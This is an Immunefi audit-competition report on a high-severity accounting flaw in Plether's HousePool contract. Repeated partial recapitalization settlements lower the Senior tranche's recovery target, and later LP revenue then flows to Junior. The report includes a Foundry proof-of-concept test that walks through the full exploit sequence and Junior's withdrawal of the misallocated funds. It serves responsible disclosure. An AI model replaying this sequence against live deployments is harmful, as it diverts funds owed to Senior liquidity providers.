# \#98713 [SC-High] Repeated partial recapitalization resets Senior's recovery target and pays later revenue to Junior

**Submitted on Nov 9th 2026 at 18:53:58 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98713
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Relevant Context

[The published tranche waterfall](https://docs.plether.com/how-plether-works/the-liquidity-pool-and-tranche-waterfall) says later LP revenue restores impaired Senior principal to its high-water mark before Junior receives the remainder. A recapitalization supplies new USDG without minting shares. When trader liabilities leave some of that amount unsupported by terminal LP equity, the remainder must stay pending until backing arrives.

The competition rules allow a documented owner recovery action that exposes a logic bug. They also allow a report on a fixed known issue when its fix is incomplete. This is the latter case: the SC-L1 fix caps the first partial settlement, but a later settlement consumes its unsupported remainder without new backing.

## Finding Description

`HousePool._reconcile` caps pending recapitalization against the *entire* terminal distributable value on every pass, then gives that amount to `HousePoolReconcilePlanLib.planReconcile` as a reservation:

```solidity
// HousePool.sol
@> HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
@>     _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);
HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(
    _currentPendingAccountingState(),
    reconcileSnapshot,
@>  _pendingClaimantBucketAssets(settleableClaimantBuckets),
    poolConfig.seniorRateBps,
    couponElapsed,
    markFresh
);

// HousePoolReconcilePlanLib.sol
@> snapshot.distributable =
@>     snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
```

On the first pass, the distributable value is unassigned, so this reservation is appropriate. On the next pass, the same value is **already Senior principal**. Reserving it again makes the planner apply a loss that zeros principal. `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` then interprets that temporary zero as a new bootstrap:

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
@>  state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
}
```

Here `recapitalizationTargetAssets` is only the *remaining* pending amount. It overwrites the larger target established by the same recapitalization on the prior pass.

For a recapitalization `R = 2U - 1 USDG` that leaves `D = U - 1 USDG` of terminal LP equity, the observed transitions are:

| Settlement | Senior principal | Senior high-water mark | Pending recapitalization |
| --- | ---: | ---: | ---: |
| First partial pass | `D` | `R` | `U` |
| Second pass, same cash and liabilities | `D` | `U` | `1 USDG` |

The second pass removes `D` from Senior's recovery target without an economic change. A third pass clears the last 1 USDG. Later revenue then fills only a 1 USDG Senior gap and accrues to Junior.

## Impact Explanation

The PoC creates the loss with accepted orders under the release risk parameters, then uses the owner's documented `recapitalizePool` and `clearDegradedMode` actions. It pays the trader claim before either harmful settlement; paying it reduces cash and liabilities equally, so terminal LP equity is unchanged. Public `settleLpEpoch` calls process real matured Junior redemption requests.

The test measures a 221,617.893878 USDG recapitalization and 110,808.446939 USDG of terminal LP equity. The second pass erases 110,808.446939 USDG of Senior's recovery target while cash and trader liabilities stay fixed. A later trader loss brings 43,089.869814 USDG of LP revenue. The intact target leaves a larger Senior recovery gap, so the whole new revenue amount belongs to Senior:

| After later revenue | Senior principal | Junior principal |
| --- | ---: | ---: |
| With the intact recovery target | 153,898.316753 USDG | 0 |
| Actual after repeated settlement | 110,809.446939 USDG | 43,088.869814 USDG |

Junior then claims **15,385.243131 USDG** through a matured redemption, even under the 80% Senior-share covenant. Senior is the victim; Junior receives Senior's recovery revenue. This measures the later allocation error, not the earlier market loss or the owner's recapitalization.

The known issues have different transitions. SC-L1 concerned an *uncapped first credit* that overstated principal. Its fix caps that credit against terminal distributable value. Here the first pass is correctly capped, then a second pass with unchanged backing reuses assigned Senior equity and lowers the target. MED-11 required a Senior withdrawal, which does not occur. MED-12 stranded same-batch revenue as `unassignedAssets`; here revenue arrives later, reaches Junior, and `unassignedAssets` remains zero.

## Recommendation

Cap pending-bucket settlement by terminal equity **not already assigned** to tranche principal or unassigned assets. Repeating reconciliation against an unchanged terminal snapshot must leave pending amounts, principal, and the Senior high-water mark unchanged. Preserve the original recapitalization target across partial passes; only a genuinely new post-wipe recapitalization may establish a new target.

## Proof of Concept

## Proof of Concept

Add `packages/perps/test/perps/accounting/waterfall/PartialRecapitalizationRecoveryTarget.t.sol` to a fresh checkout with the following contents. From the repository root, run:

```bash
forge test --root packages/perps --match-path test/perps/accounting/waterfall/PartialRecapitalizationRecoveryTarget.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

contract PartialRecapitalizationRecoveryTargetTest is BasePerpTest {

    address private constant SENIOR_LP = address(0x5101);
    address private constant JUNIOR_LP = address(0x5102);
    address private constant REDEEMER = address(0x5103);
    address private constant LONG_WINNER = address(0x5104);
    address private constant SHORT_WINNER = address(0x5105);
    address private constant LOSING_TRADER = address(0x5106);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        // Together with the release's 1 USDG seed in each tranche, these deposits
        // produce 450,000 Senior / 150,000 Junior, below the release 80% Senior limit.
        _fundJunior(JUNIOR_LP, 149_999e6);
        _fundSenior(SENIOR_LP, 449_999e6);

        // A one-share request has no economic effect after the wipe, but processing it is
        // real permissionless LP-queue work. Reclaiming the rejected share lets the same LP
        // create the next matured epoch through ordinary ERC-7540 calls.
        vm.warp(juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(JUNIOR_LP);
        juniorVault.transfer(REDEEMER, 1);
    }

    function test_PartialRecapitalizationRepeatedSettlementCutsSeniorRecoveryAndPaysJunior() public {
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer must remain active");
        assertEq(engine.executionFeeBps(), 4, "release execution fee must remain active");
        assertEq(pool.seniorRateBps(), 800, "release Senior rate must remain active");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap must remain active");
        assertEq(pool.maxSeniorShareBps(), 8000, "release 80% Senior covenant must remain active");

        uint256 depthBeforeLoss = pool.totalAssets();
        uint256 firstIncreaseAssets = _roundToLots(depthBeforeLoss * 39 / 100);
        uint256 finalIncreaseAssets = _roundToLots(depthBeforeLoss * 21 / 100);
        uint256 profitPerWinner = firstIncreaseAssets * 2 + finalIncreaseAssets;

        // Every trade uses the public commit -> Pyth update -> execute path. The Router therefore
        // supplies live pool depth and enforces timing, FIFO, oracle, policy, and slippage checks.
        // Alternating increases keep the release max-skew ratio at or below 40%, while both
        // opposite sides reach 99% of depth under the unchanged 25 bps settlement buffer.
        // Sequential moves to the two positive terminal prices then exhaust LP cash and
        // create a real unpaid trader claim, without direct token burns or storage writes.
        _fundTrader(LONG_WINNER, profitPerWinner);
        _fundTrader(SHORT_WINNER, profitPerWinner);
        _increaseBalancedPositions(firstIncreaseAssets);
        _increaseBalancedPositions(firstIncreaseAssets);
        _increaseBalancedPositions(finalIncreaseAssets);
        _closeThroughRouter(LONG_WINNER, CfdTypes.Side.LONG, profitPerWinner * 1e12, 40_000_000);
        _closeThroughRouter(SHORT_WINNER, CfdTypes.Side.SHORT, profitPerWinner * 1e12, 160_000_000);

        uint256 traderClaim = engine.traderClaimBalanceAssets(SHORT_WINNER);
        assertGt(traderClaim, depthBeforeLoss / 10, "ordinary closes must create a material unpaid claim");
        assertEq(engine.totalTraderClaimBalanceAssets(), traderClaim, "the short winner is the only unpaid claimant");
        assertTrue(engine.degradedMode(), "the loss should put the engine into its insolvency state");

        uint256 retainedCash = pool.totalAssets();
        assertGt(traderClaim, retainedCash, "the unpaid claim must leave LP equity fully wiped");
        uint256 unfundedLiability = traderClaim - retainedCash;

        // The owner supplies just under twice the unfunded liability. Net terminal equity is therefore
        // unfundedLiability - $1, while slightly more than half of the recap remains pending.
        uint256 residualAfterSecondPass = 1e6;
        uint256 recapitalization = unfundedLiability * 2 - residualAfterSecondPass;
        uint256 netTerminalEquity = unfundedLiability - residualAfterSecondPass;
        emit log_named_decimal_uint("unfunded trader liability", unfundedLiability, 6);
        emit log_named_decimal_uint("legitimate recapitalization", recapitalization, 6);
        emit log_named_decimal_uint("terminal LP equity after recap", netTerminalEquity, 6);
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        engine.clearDegradedMode();

        // A rational winner claims immediately. Cash and trader liabilities fall equally,
        // so terminal LP equity and the vulnerable repeated-settlement state are unchanged.
        vm.prank(SHORT_WINNER);
        engine.settleTraderClaim(SHORT_WINNER);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "the trader claim should be paid in full");
        assertEq(pool.totalAssets(), netTerminalEquity, "paying equal cash and liability preserves LP equity");

        uint256 requestId = _requestAllRedeemerShares();
        IHousePool.LpEpochSettlementResult memory first = _settleRequest(requestId);
        assertEq(first.juniorProcessedEpochs, 1, "the first public settlement must advance a real LP epoch");
        assertEq(pool.seniorPrincipal(), netTerminalEquity, "only net terminal equity is backed");
        assertEq(
            pool.seniorHighWaterMark(),
            recapitalization,
            "the first partial pass records the full recap recovery target"
        );
        assertEq(pool.pendingRecapitalizationAssets(), unfundedLiability, "the unsupported remainder stays pending");
        _claimWorthlessRedeemRefund(requestId);

        uint256 cashBeforeSecondPass = pool.totalAssets();
        uint256 claimsBeforeSecondPass = engine.totalTraderClaimBalanceAssets();
        requestId = _requestAllRedeemerShares();
        IHousePool.LpEpochSettlementResult memory second = _settleRequest(requestId);
        assertEq(second.juniorProcessedEpochs, 1, "the second public settlement must advance the next LP epoch");
        assertEq(pool.totalAssets(), cashBeforeSecondPass, "no cash changed between the two passes");
        assertEq(
            engine.totalTraderClaimBalanceAssets(),
            claimsBeforeSecondPass,
            "no terminal liability changed between the two passes"
        );
        assertEq(pool.seniorPrincipal(), netTerminalEquity, "settling the same cash twice must not add principal");
        assertEq(pool.seniorHighWaterMark(), unfundedLiability, "the second pass incorrectly replaces the full target");
        assertEq(
            recapitalization - pool.seniorHighWaterMark(),
            netTerminalEquity,
            "almost half of the recap loses Senior recovery priority"
        );
        emit log_named_decimal_uint(
            "Senior recovery target erased without an economic change", recapitalization - pool.seniorHighWaterMark(), 6
        );
        assertEq(pool.pendingRecapitalizationAssets(), residualAfterSecondPass);
        assertEq(pool.unassignedAssets(), 0, "the repeated-recap bug is distinct from MED-12");
        _claimWorthlessRedeemRefund(requestId);

        // A third bounded queue pass clears the final $1 without changing the corrupted target.
        requestId = _requestAllRedeemerShares();
        _settleRequest(requestId);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.seniorPrincipal(), netTerminalEquity);
        assertEq(pool.seniorHighWaterMark(), unfundedLiability);
        _claimWorthlessRedeemRefund(requestId);

        uint256 revenuePositionAssets = _roundToLots(netTerminalEquity * 39 / 100);
        uint256 cashBeforeRevenue = pool.totalAssets();
        _fundTrader(LOSING_TRADER, revenuePositionAssets * 2);
        _openThroughRouter(LOSING_TRADER, CfdTypes.Side.LONG, revenuePositionAssets * 1e12, revenuePositionAssets, 1e8);
        _closeThroughRouter(LOSING_TRADER, CfdTypes.Side.LONG, revenuePositionAssets * 1e12, 2e8);
        uint256 laterRevenue = pool.totalAssets() - cashBeforeRevenue;
        emit log_named_decimal_uint("later LP trading revenue", laterRevenue, 6);
        assertGt(laterRevenue, residualAfterSecondPass, "the later loss must create material LP revenue");
        assertEq(
            pool.pendingTradingRevenueAssets(), 0, "with live principal, normal trade revenue is reconciled from cash"
        );

        requestId = _requestAllRedeemerShares();
        IHousePool.LpEpochSettlementResult memory fourth = _settleRequest(requestId);
        assertEq(fourth.juniorProcessedEpochs, 1, "revenue settlement also advances a real LP epoch");

        uint256 expectedSeniorRecovery = residualAfterSecondPass;
        assertEq(
            pool.seniorPrincipal(),
            netTerminalEquity + expectedSeniorRecovery,
            "the lowered target lets Senior recover only the artificial $1 gap"
        );
        assertEq(
            pool.juniorPrincipal(),
            laterRevenue - expectedSeniorRecovery,
            "the rest of the revenue is transferred to Junior instead of restoring Senior"
        );
        assertGt(pool.juniorPrincipal(), laterRevenue * 99 / 100, "more than 99% of this recovery is misallocated");
        assertEq(pool.unassignedAssets(), 0, "later revenue reaches Junior rather than MED-12 unassigned assets");

        uint256 juniorShares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 juniorExitId = juniorVault.requestRedeem(juniorShares, JUNIOR_LP, JUNIOR_LP);
        vm.warp(pool.lpEpochStart(juniorExitId));
        IHousePool.LpEpochSettlementResult memory exitResult = pool.settleLpEpoch(0, 0);
        assertGt(
            exitResult.juniorFundedAssets,
            laterRevenue * 30 / 100,
            "even the release 80% Senior covenant leaves material misallocated revenue withdrawable"
        );
        uint256 claimableShares = juniorVault.claimableRedeemRequest(juniorExitId, JUNIOR_LP);
        uint256 juniorCashBefore = settlementToken.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 withdrawnAssets = juniorVault.claimRedeem(juniorExitId, claimableShares, JUNIOR_LP, JUNIOR_LP);
        assertEq(settlementToken.balanceOf(JUNIOR_LP) - juniorCashBefore, withdrawnAssets);
        assertGt(withdrawnAssets, laterRevenue * 30 / 100, "Junior can claim the wrongly allocated cash");
        emit log_named_decimal_uint("wrongly allocated revenue claimed by Junior", withdrawnAssets, 6);
    }

    function _increaseBalancedPositions(
        uint256 assets
    ) private {
        uint256 size = assets * 1e12;
        uint256 margin = assets / 20;
        _openThroughRouter(LONG_WINNER, CfdTypes.Side.LONG, size, margin, 1e8);
        _openThroughRouter(SHORT_WINNER, CfdTypes.Side.SHORT, size, margin, 1e8);
    }

    function _openThroughRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) private {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, price, false);
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(account);
        router.executeOrder(orderId, updateData);
    }

    function _closeThroughRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) private {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, 0, price, true);
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(account);
        router.executeOrder(orderId, updateData);
    }

    function _roundToLots(
        uint256 assets
    ) private pure returns (uint256) {
        return assets / 100e6 * 100e6;
    }

    function _requestAllRedeemerShares() private returns (uint256 requestId) {
        uint256 shares = juniorVault.balanceOf(REDEEMER);
        assertEq(shares, 1, "the zero-value share should have returned from the prior epoch");
        vm.prank(REDEEMER);
        requestId = juniorVault.requestRedeem(shares, REDEEMER, REDEEMER);
    }

    function _settleRequest(
        uint256 requestId
    ) private returns (IHousePool.LpEpochSettlementResult memory result) {
        vm.warp(pool.lpEpochStart(requestId));
        result = pool.settleLpEpoch(0, 0);
        assertEq(result.juniorFundedAssets, 0, "a wiped Junior request must not change terminal equity");
        assertEq(juniorVault.refundableRedeemRequest(requestId, REDEEMER), 1);
    }

    function _claimWorthlessRedeemRefund(
        uint256 requestId
    ) private {
        vm.prank(REDEEMER);
        assertEq(juniorVault.claimRedeemRefund(requestId, REDEEMER, REDEEMER), 1);
        vm.warp(juniorVault.lastDepositTime(REDEEMER) + juniorVault.DEPOSIT_COOLDOWN());
    }

}
```

Result from running that test: `1 passed; 0 failed`. The logs show the Senior target falling by `110808.446939` USDG with unchanged backing, followed by `43089.869814` USDG of later LP revenue and `15385.243131` USDG claimed by Junior.
